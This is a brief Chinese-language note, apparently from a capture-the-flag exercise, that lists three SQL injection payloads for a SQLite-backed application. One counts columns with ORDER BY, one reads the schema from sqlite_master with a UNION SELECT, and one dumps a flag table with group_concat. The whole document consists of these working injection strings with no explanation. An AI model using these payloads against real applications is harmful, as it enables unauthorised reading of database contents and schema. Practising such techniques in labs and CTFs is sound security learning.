---

---
查字段
`order by 6` 

查看表

`union select 1,2,3,sqlite_version(),(select sql from sqlite_master limit 0,1)---` 

查数据
`union select 1,2,3,sqlite_version(),(select group_concat(flag) from flag)--`

